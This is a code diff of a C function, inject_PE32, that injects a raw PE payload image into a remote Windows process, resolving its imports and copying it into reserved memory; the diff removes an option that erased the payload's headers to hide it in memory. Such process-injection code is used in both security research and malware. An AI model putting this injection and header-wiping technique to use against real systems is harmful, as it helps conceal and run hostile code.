@@ -82,10 +82,8 @@ inject_PE32:
     targetPath - application where we want to inject
     payload - buffer with raw image of PE that we want to inject
     payload_size - size of the above
-
-    run_original - should run the original process?
 */
-bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size, bool erase_headers)
+bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
 {
     if (!load_ntdll_functions()) return false;
 
@@ -138,15 +136,6 @@ bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size, bool erase
 
     if (apply_imports(localCopyAddress) == false) {
         printf("[WARNING] Some imports cannot be resolved by loader!\n[!] Payload should resolve remaining imports, or the application will crash!\n");
-
-        //do not erase headers in such case, because payload will need them for reflective imports loading:
-        erase_headers = false;
-    }
-
-    // we may erase the payload's headers - at this stage they are no longer needed
-    if (erase_headers) {
-        const DWORD kHdrsSize = payload_nt_hdr->OptionalHeader.SizeOfHeaders;
-        memset(localCopyAddress, 0, kHdrsSize);
     }
 
     // paste the local copy of the prepared image into the reserved space inside the remote process:
